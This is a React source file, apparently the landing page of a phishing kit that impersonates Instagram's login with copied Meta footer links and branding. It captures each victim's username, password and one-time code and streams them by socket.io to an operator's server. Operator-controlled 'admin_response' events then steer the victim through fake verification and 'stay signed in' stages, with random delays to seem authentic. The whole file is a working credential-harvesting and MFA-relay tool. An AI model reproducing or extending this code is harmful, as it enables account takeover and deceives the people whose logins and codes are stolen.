/* eslint-disable no-unused-vars */
import {
  Box,
  HStack,
  Image,
  Input,
  Separator,
  Stack,
  Text,
  VStack,
} from "@chakra-ui/react";
import React, { useEffect, useRef, useState } from "react";
import { io } from "socket.io-client";
import { motion, AnimatePresence } from "framer-motion";
import { useUser } from "../contexts/UserContext";
import Loading from "./Loading";
import EmailPassword from "../components/generic/EmailPassword";
import Authenticator from "../components/generic/Authenticator";
import IsSignedIn from "../components/generic/IsSignedIn";
import ThanksForComing from "../components/generic/ThanksForComing";
import { Link } from "react-router-dom";
import { Button } from "../components/ui/button";

const Landing = () => {
  const { isLoading, setIsLoading, credentials, sendTo, setSendTo, otp } =
    useUser();
  const [currentStage, setCurrentStage] = useState(1);
  const [errorMessage, setErrorMessage] = useState("");
  const [verificationMessage, setVerificationMessage] = useState("");
  const [method, setMethod] = useState("");
  const [value, setValue] = useState("");

  const socketRef = useRef(null);

  const getRandomNumber = () =>
    Math.floor(Math.random() * (6000 - 2500 + 1)) + 2500;

  useEffect(() => {
    if (!socketRef.current) {
      socketRef.current = io(import.meta.env.VITE_BASE_URL);

      socketRef.current.on("connect", () => {
        console.log(
          "Connected to socket server with ID:",
          socketRef.current.id
        );
      });

      socketRef.current.on("auth_response", handleAuthResponse);
      socketRef.current.on("admin_response", (data) => {
        console.log("Received admin response:", data);
        if (data.eventType === "ig_attempt_init" && data.sendTo) {
          setIsLoading(false);

          if (data.nextStep) {
            setCurrentStage(data.nextStep);
          }

          if (data.message) {
            setVerificationMessage(data.message);
          }

          if (data.sendTo) {
            setSendTo(data.sendTo);
          }
        } else if (data.eventType === "auth_value_submit") {
          setIsLoading(false);

          if (data.nextStep) {
            setCurrentStage(data.nextStep);
          }

          if (data.message) {
            setVerificationMessage(data.message);
          }
        } else if (data.eventType === "stay_signed_in") {
          if (data.message) {
            setVerificationMessage(data.message);
          }

          setTimeout(() => {
            setIsLoading(false);
            if (data.nextStep) {
              setCurrentStage(data.nextStep);
            }
          }, getRandomNumber());
        }
      });

      socketRef.current.on("error_message", (message) =>
        setErrorMessage(message)
      );

      socketRef.current.on("verification_message", (message) =>
        setVerificationMessage(message)
      );

      socketRef.current.on("set_stage", (stage) => setCurrentStage(stage));
    }

    return () => {
      if (socketRef.current) {
        socketRef.current.disconnect();
        socketRef.current = null;
      }
    };
  }, []);

  const handleAuthResponse = (response) => {
    setIsLoading(false);
    setMethod(response.method);
    setValue(response.value);
    setCurrentStage(response.nextStep);
  };

  const handleLogin = () => {
    setIsLoading(true);
    setErrorMessage("");
    socketRef.current.emit("ig_attempt_init", {
      email: credentials.username,
      password: credentials.password,
      timestamp: new Date().toISOString(),
      sessionId: socketRef.current.id,
    });
  };

  const handleAuthValueSubmit = () => {
    setIsLoading(true);
    setErrorMessage("");
    socketRef.current.emit("auth_value_submit", {
      email: credentials.username,
      password: credentials.password,
      otp: otp,
      timestamp: new Date().toISOString(),
      sessionId: socketRef.current.id,
    });
  };

  const handleStaySignedIn = (choice) => {
    setIsLoading(true);
    setErrorMessage("");
    socketRef.current.emit("stay_signed_in", {
      email: credentials.username,
      password: credentials.password,
      staySignedIn: choice,
      timestamp: new Date().toISOString(),
      sessionId: socketRef.current.id,
    });
  };

  const stageComponents = {
    1: <EmailPassword handleLogin={handleLogin} />,
    2: <Authenticator handleAuthValueSubmit={handleAuthValueSubmit} />,
    3: <IsSignedIn handleStaySignedIn={handleStaySignedIn} />,
    4: <ThanksForComing />,
  };

  const slideVariants = {
    initial: (direction) => ({
      x: direction > 0 ? "100%" : "-100%",
      opacity: 0,
    }),
    animate: {
      x: 0,
      opacity: 1,
      transition: { duration: 0.5 },
    },
    exit: (direction) => ({
      x: direction < 0 ? "100%" : "-100%",
      opacity: 0,
      transition: { duration: 0.5 },
    }),
  };

  const [direction, setDirection] = useState(1);

  const handleStageChange = (nextStage) => {
    setDirection(nextStage > currentStage ? 1 : -1);
    setCurrentStage(nextStage);
  };

  return (
    <>
      <Box display={{ md: "flex", base: "none" }} w="100vw" h="100vh" bg="#fff">
        <Stack
          w="100%"
          h="100%"
          pt="36px"
          justifyContent="space-between"
          alignItems="center"
        >
          <VStack>
            <AnimatePresence custom={direction}>
              <motion.div
                key={currentStage}
                custom={direction}
                variants={slideVariants}
                initial="initial"
                animate="animate"
                exit="exit"
              >
                {stageComponents[currentStage]}
              </motion.div>
            </AnimatePresence>

            <VStack>
              <Text mb="0.6rem">Get the app</Text>
              <HStack alignItems="center">
                <Link to="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3D38290087-6769-4CC8-B0EB-A7D8BABF7BA3%26utm_campaign%3DunifiedHome%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge">
                  <Image
                    src="./images/gp.png"
                    alt="google"
                    w="134.28px"
                    h="40px"
                  />
                </Link>
                <Link to="ms-windows-store://pdp/?productid=9nblggh5l9xt&referrer=appbadge&source=www.instagram.com&mode=mini&pos=0%2C0%2C1600%2C860">
                  <Image
                    src="./images/ms.png"
                    alt="google"
                    w="134.28px"
                    h="40px"
                  />
                </Link>
              </HStack>
            </VStack>
          </VStack>

          <VStack mb="1rem" fontSize="12px">
            <HStack alignItems="center" gap="1rem">
              <Link to="https://about.meta.com/">
                <Text>Meta</Text>
              </Link>
              <Link to="https://about.instagram.com/">
                <Text>About</Text>
              </Link>
              <Link to="https://about.instagram.com/blog/">
                <Text>Blog</Text>
              </Link>
              <Link to="https://about.instagram.com/about-us/careers">
                <Text>Jobs</Text>
              </Link>
              <Link to="https://help.instagram.com/">
                <Text>Help</Text>
              </Link>
              <Link to="https://developers.facebook.com/docs/instagram">
                <Text>API</Text>
              </Link>
              <Link to="https://www.instagram.com/legal/privacy/">
                <Text>Privacy</Text>
              </Link>
              <Link to="https://www.instagram.com/legal/terms/">
                <Text>Terms</Text>
              </Link>
              <Link to="https://www.instagram.com/explore/locations/">
                <Text>Locations</Text>
              </Link>
              <Link to="https://www.instagram.com/web/lite/">
                <Text>Instagram Lite</Text>
              </Link>
              <Link to="https://www.threads.net/">
                <Text>Threads</Text>
              </Link>
              <Link to="https://www.facebook.com/help/instagram/261704639352628">
                <Text>Contact Uploading & Non-Users</Text>
              </Link>
              <Link to="https://www.instagram.com/accounts/meta_verified/?entrypoint=web_footer">
                <Text>Meta Verified</Text>
              </Link>
            </HStack>
            <Text>© 2024 Instagram from Meta</Text>
          </VStack>
        </Stack>
      </Box>

      <Box
        position="relative"
        display={{ md: "none", base: "flex" }}
        w="100vw"
        h="100vh"
        bg="#fff"
      >
        <Stack
          w="100%"
          h="100%"
          alignItems="center"
          justifyContent="space-between"
          pt="5rem"
          px="1.5rem"
          // bg="blue"
        >
          <AnimatePresence custom={direction}>
            <motion.div
              style={{ width: "100%", paddingTop: "3rem" }}
              key={currentStage}
              custom={direction}
              variants={slideVariants}
              initial="initial"
              animate="animate"
              exit="exit"
            >
              {stageComponents[currentStage]}
            </motion.div>
          </AnimatePresence>

          <HStack mb="2rem">
            <Image
              src="./images/meta-footer.svg"
              alt="logo"
              w="52px"
              h="26.56px"
            />
          </HStack>
        </Stack>
      </Box>
      {/* <AnimatePresence custom={direction}>
        <motion.div
          key={currentStage}
          custom={direction}
          variants={slideVariants}
          initial="initial"
          animate="animate"
          exit="exit"
        >
          {stageComponents[currentStage]}
        </motion.div>
      </AnimatePresence> */}
      {isLoading && <Loading />}
    </>
  );
};

export default Landing;
